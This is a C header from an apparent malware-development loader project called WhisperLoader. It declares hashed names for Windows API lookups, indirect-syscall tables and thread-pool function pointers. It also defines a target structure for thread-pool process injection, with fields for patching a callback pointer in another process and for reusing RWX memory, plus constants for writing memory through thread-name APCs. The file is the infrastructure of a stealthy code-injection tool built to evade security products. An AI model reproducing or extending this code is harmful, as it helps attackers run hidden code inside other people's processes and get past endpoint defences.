// Copyright 2026 MalDev Academy
// WhisperLoader - Licensed under the Apache License, Version 2.0 (the "License")
// https://github.com/Maldev-Academy/WhisperLoader

#pragma once
#ifndef HEADERS_H
#define HEADERS_H


#include <Windows.h>
#include <Strsafe.h>
#include <intrin.h>
#include <immintrin.h>

#include "Structures.h"
#include "DbgMacros.h"               
#include "InternalStructures.h"      
#include "IndirectSyscalling.h"     
#include "ResolveAPIs.h"       
#include "ReadThroughGadgets.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "User32.lib") 

// =================================================================================================================
// The following constants are used only in WriteMemoryViaThreadNameApc
// Read the comments in WriteMemoryViaThreadNameApc for more info

#define MAX_THREAD_NAME_LEN         0xFFFE                                          // Kernel cap for ThreadNameInformation: 64KB - sizeof(WCHAR)
// #define TNC_WAIT_TIMEOUT_MS         5000                                         // 5-second ceiling per chunk 

#define TNC_WAIT_TIMEOUT_MS         60000000                                        // DBG


/* OPTION 1 */
#define PEB_SCRATCH_SLOT_OFFSET   offsetof(PEB, SpareUlongs)                      // Offset of the PEB scratch slot used as the APC drop-point for the heap pointer (explained below)
C_ASSERT(sizeof(((PEB*)0)->SpareUlongs) >= sizeof(PVOID));                        // Must be at least pointer-sized


/* OPTION 2 */
//#define PEB_SCRATCH_SLOT_OFFSET    offsetof(PEB, PostProcessInitRoutine)           
//C_ASSERT(sizeof(((PEB*)0)->PostProcessInitRoutine) >= sizeof(PVOID));


/* OPTION 3 */
//#define TEB_SCRATCH_SLOT_IDX        63                                              // TlsSlots[63]; last of the 64, but almost always unused. 
//#define TEB_SCRATCH_SLOT_OFFSET     (offsetof(TEB, TlsSlots) + (TEB_SCRATCH_SLOT_IDX * sizeof(PVOID)))
//C_ASSERT(TEB_SCRATCH_SLOT_IDX < RTL_NUMBER_OF(((PTEB)0)->TlsSlots));                // Slot index must be inside the fixed TlsSlots array


#if !defined(PEB_SCRATCH_SLOT_OFFSET) && !defined(TEB_SCRATCH_SLOT_OFFSET)
#error "No scratch slot defined; enable one of OPTION 1, 2, or 3"
#endif
#if defined(PEB_SCRATCH_SLOT_OFFSET) && defined(TEB_SCRATCH_SLOT_OFFSET)
#error "Both PEB and TEB scratch slots defined; enable only one"
#endif

// =================================================================================================================

/*
python.exe .\Crc32bHasher.py NtQuerySystemInformation NtOpenProcess NtQueryInformationProcess NtClose NtOpenThread NtQueryVirtualMemory NtAllocateVirtualMemory RtlFillMemory RtlMoveMemory NtQueueApcThread
NtProtectVirtualMemory NtCreateUserProcess RtlCreateProcessParametersEx RtlDestroyProcessParameters RtlInitUnicodeString NtAlertThread NtSetInformationThread NtReadVirtualMemory GetThreadDescription NtCreateEvent
NtDuplicateObject NtWaitForSingleObject NtSetEvent NtQueryInformationThread NtSetIoCompletion NtQueryInformationWorkerFactory NtCreateNamedPipeFile NtCreateJobObject NtAlpcCreatePort
TpAllocIoCompletion TpAllocAlpcCompletion TpAllocJobNotification TpReleaseIoCompletion TpReleaseAlpcCompletion TpReleaseJobNotification
*/
#define CRC32B_NTQUERYSYSTEMINFORMATION                 0x97FD2398
#define CRC32B_NTOPENPROCESS                            0xDBF381B5
#define CRC32B_NTQUERYINFORMATIONPROCESS                0xA5C44C50
#define CRC32B_NTCLOSE                                  0x0D09C750
#define CRC32B_NTOPENTHREAD                             0xB7A26D79
#define CRC32B_NTQUERYVIRTUALMEMORY                     0x03F6F38C
#define CRC32B_NTALLOCATEVIRTUALMEMORY                  0xE0762FEB
#define CRC32B_RTLFILLMEMORY                            0xEF153911
#define CRC32B_RTLMOVEMEMORY                            0x1C0CD35C
#define CRC32B_NTQUEUEAPCTHREAD                         0x235B0390
#define CRC32B_NTPROTECTVIRTUALMEMORY                   0x5C2D1A97
#define CRC32B_NTCREATEUSERPROCESS                      0x05AAA327
#define CRC32B_RTLCREATEPROCESSPARAMETERSEX             0x336B43C3
#define CRC32B_RTLDESTROYPROCESSPARAMETERS              0x725AA62D
#define CRC32B_RTLINITUNICODESTRING                     0x7AA7B69B
#define CRC32B_NTALERTTHREAD                            0xD4A60DEB
#define CRC32B_NTSETINFORMATIONTHREAD                   0x466F2056
#define CRC32B_NTREADVIRTUALMEMORY                      0x81223212
#define CRC32B_GETTHREADDESCRIPTION                     0xE188A086
#define CRC32B_NTCREATEEVENT                            0xA4A397F8
#define CRC32B_NTDUPLICATEOBJECT                        0xD23B7C02
#define CRC32B_NTWAITFORSINGLEOBJECT                    0xDD554681
#define CRC32B_NTSETEVENT                               0x606FC7B2
#define CRC32B_NTQUERYINFORMATIONTHREAD                 0x31133574
#define CRC32B_NTSETIOCOMPLETION                        0xC9EA591B
#define CRC32B_NTQUERYINFORMATIONWORKERFACTORY          0x276FEB87
#define CRC32B_NTCREATENAMEDPIPEFILE                    0x1457681F
#define CRC32B_NTCREATEJOBOBJECT                        0x97DE3BF9
#define CRC32B_NTALPCCREATEPORT                         0xD670D45E
#define CRC32B_TPALLOCIOCOMPLETION                      0x749DA510
#define CRC32B_TPALLOCALPCCOMPLETION                    0x7175BA70
#define CRC32B_TPALLOCJOBNOTIFICATION                   0xFF58F5A0
#define CRC32B_TPRELEASEIOCOMPLETION                    0x2BE00020
#define CRC32B_TPRELEASEALPCCOMPLETION                  0x088F8499
#define CRC32B_TPRELEASEJOBNOTIFICATION                 0x26F75542
/*
python.exe .\Crc32bHasher.py -i ntdll.dll kernel32.dll
*/
#define CRC32B_NTDLLDLL                                 0x84C05E40
#define CRC32B_KERNEL32DLL                              0x6AE69F02

// =================================================================================================================

// Safety cap for the PoolObjectList walk.
#define POOL_OBJECT_LIST_MAX_ITER                   512

// =================================================================================================================

#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON     (0x00000001ULL << 44)
#endif
#ifndef PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON             (0x00000001ULL << 52)
#endif
#ifndef PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON          (0x00000001ULL << 56)
#endif
#ifndef PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON          (0x00000001ULL << 32)
#endif

#define MITIGATION_POLICY_HARDENED                                                                                    \
    ((UINT64)PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON  |                             \
     (UINT64)PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON          |                             \
     (UINT64)PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON       |                             \
     (UINT64)PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON)


typedef NTSTATUS (NTAPI *fnRtlCreateProcessParametersEx)(
    OUT PRTL_USER_PROCESS_PARAMETERS   *pProcessParameters,
    IN  PUNICODE_STRING                 ImagePathName,
    IN  PUNICODE_STRING                 DllPath                 OPTIONAL,
    IN  PUNICODE_STRING                 CurrentDirectory        OPTIONAL,
    IN  PUNICODE_STRING                 CommandLine             OPTIONAL,
    IN  PVOID                           Environment             OPTIONAL,
    IN  PUNICODE_STRING                 WindowTitle             OPTIONAL,
    IN  PUNICODE_STRING                 DesktopInfo             OPTIONAL,
    IN  PUNICODE_STRING                 ShellInfo               OPTIONAL,
    IN  PUNICODE_STRING                 RuntimeData             OPTIONAL,
    IN  ULONG                           Flags
);

typedef NTSTATUS (NTAPI *fnRtlDestroyProcessParameters)(
    IN PRTL_USER_PROCESS_PARAMETERS     pProcessParameters
);

typedef VOID (NTAPI *fnRtlInitUnicodeString)(
    OUT PUNICODE_STRING                 DestinationString,
    IN  PCWSTR                          SourceString OPTIONAL
);

// =================================================================================================================

typedef VOID (NTAPI *PTP_ALPC_CALLBACK)(
    PTP_CALLBACK_INSTANCE       Instance,
    PVOID                       Context,
    PVOID                       Alpc
);

typedef NTSTATUS (NTAPI *fnTpAllocAlpcCompletion)(
    TP_ALPC**                   OutAlpc,
    HANDLE                      hAlpcPort,
    PTP_ALPC_CALLBACK           Callback,
    PVOID                       Context,
    PTP_CALLBACK_ENVIRON        CallbackEnviron
);

typedef VOID (NTAPI *PTP_JOB_CALLBACK)(
    PTP_CALLBACK_INSTANCE       Instance,
    PVOID                       Context,
    HANDLE                      Job,
    ULONG                       JobNotification,
    ULONG_PTR                   Data
);

typedef NTSTATUS (NTAPI *fnTpAllocJobNotification)(
    TP_JOB**                    OutJob,
    HANDLE                      hJob,
    PTP_JOB_CALLBACK            Callback,
    PVOID                       Context,
    PTP_CALLBACK_ENVIRON        CallbackEnviron
);

typedef NTSTATUS (NTAPI *fnTpAllocIoCompletion)(
    OUT PTP_IO                 *OutIo,
    IN  HANDLE                  hFile,
    IN  PTP_WIN32_IO_CALLBACK   Callback,
    IN  PVOID                   Context OPTIONAL,
    IN  PTP_CALLBACK_ENVIRON    CallbackEnviron OPTIONAL
);

typedef VOID (NTAPI *fnTpReleaseIoCompletion)(
    IN OUT TP_IO*                   Io
);

typedef VOID (NTAPI *fnTpReleaseAlpcCompletion)(
    IN OUT TP_ALPC*                 Alpc
);

typedef VOID (NTAPI *fnTpReleaseJobNotification)(
    IN OUT TP_JOB*                  Job
);


DWORD GetTppIopCleanupGroupMemberVFuncsRva   (IN HMODULE hNtdllModule);
DWORD GetTppAlpcpCleanupGroupMemberVFuncsRva (IN HMODULE hNtdllModule);
DWORD GetTppJobpCleanupGroupMemberVFuncsRva  (IN HMODULE hNtdllModule);

// =================================================================================================================


typedef struct _API_IMPORTS
{
    // kernel32
    PVOID                              pGetThreadDescription;

    // ntdll - Rtl helpers
    PVOID                              pRtlFillMemory;
    PVOID                              pRtlMoveMemory;
    fnRtlCreateProcessParametersEx     pRtlCreateProcessParametersEx;
    fnRtlDestroyProcessParameters      pRtlDestroyProcessParameters;
    fnRtlInitUnicodeString             pRtlInitUnicodeString;

    // ntdll - Nt (Called Via APCs) 
    PVOID                              pNtSetEvent;
    PVOID                              pNtClose;

    // ntdll - Tp non-syscall exports
    fnTpAllocAlpcCompletion            pTpAllocAlpcCompletion;
    fnTpAllocJobNotification           pTpAllocJobNotification;
    fnTpAllocIoCompletion              pTpAllocIoCompletion;
    fnTpReleaseIoCompletion            pTpReleaseIoCompletion;
    fnTpReleaseAlpcCompletion          pTpReleaseAlpcCompletion;
    fnTpReleaseJobNotification         pTpReleaseJobNotification;

    // ntdll - internal data tables (base + RVA, not exports)
    PVOID                              pTppIopCleanupGroupMemberVFuncs;
    PVOID                              pTppAlpcpCleanupGroupMemberVFuncs;
    PVOID                              pTppJobpCleanupGroupMemberVFuncs;

} API_IMPORTS, *PAPI_IMPORTS;

typedef struct _NT_SYSCALLS
{
    NT_SYSCALL  ntOpenProcess;
    NT_SYSCALL  ntQuerySystemInformation;
    NT_SYSCALL  ntOpenThread;
    NT_SYSCALL  ntQueryInformationProcess;
    NT_SYSCALL  ntClose;
    NT_SYSCALL  ntQueryVirtualMemory;
    NT_SYSCALL  ntAllocateVirtualMemory;
    NT_SYSCALL  ntQueueApcThread;
    NT_SYSCALL  ntProtectVirtualMemory;
    NT_SYSCALL  ntCreateUserProcess;
    NT_SYSCALL  ntAlertThread;
    NT_SYSCALL  ntSetInformationThread;
    NT_SYSCALL  ntReadVirtualMemory;
    NT_SYSCALL  ntCreateEvent;
    NT_SYSCALL  ntDuplicateObject;
    NT_SYSCALL  ntWaitForSingleObject;
    NT_SYSCALL  ntSetIoCompletion;
    NT_SYSCALL  ntQueryInformationWorkerFactory;
    NT_SYSCALL  ntQueryInformationThread;

    NT_SYSCALL  ntCreateNamedPipeFile;
    NT_SYSCALL  ntCreateJobObject;
    NT_SYSCALL  ntAlpcCreatePort;

} NT_SYSCALLS, *PNT_SYSCALLS;


typedef struct _TP_INJECT_TARGET
{
    // Target Process / Thread Context 
    DWORD           dwProcessId;
    DWORD           dwThreadId;
    HANDLE          hProcess;
    HANDLE          hThread;
    HANDLE          hIoCompletion;
    WCHAR           wszProcessName[MAX_PATH];

    // Pool Object Found In Target 
    TP_OBJECT_KIND  TpObjectFound;           // Type found: TP_IO or TP_ALPC or TP_JOB
    PVOID           pOuterBase;              // Base VA of containing TP_IO / TP_ALPC / TP_JOB
    PVOID           pTpDirectVA;             // VA of &TP_<kind>.Direct  (KeyContext for NtSetIoCompletion)
    PVOID           pTpDirectCallbackVA;     // VA of &TP_DIRECT.Callback (8-byte patch target)
    PVOID           pOriginalCallback;       // Current Callback value   (seeded into restore stub)

    // RWX Reuse State 
    BOOL            bReusedRwx;              // If TRUE (we found reusable RWX region), injection logic skips NtAllocateVirtualMemory & NtProtectVirtualMemory
    PVOID           pReusedRwxBase;          // Base of reused region (NULL if bReusedRwx == FALSE)
    SIZE_T          cbReusedRwxSize;         // Size of reused region (0    if bReusedRwx == FALSE)

} TP_INJECT_TARGET, *PTP_INJECT_TARGET;


// =================================================================================================================

extern API_IMPORTS          g_WinAPIs;
extern NT_SYSCALLS          g_Syscalls;
extern TP_INJECT_TARGET     g_tpInjectTarget;

// =================================================================================================================

#endif // !HEADERS_H
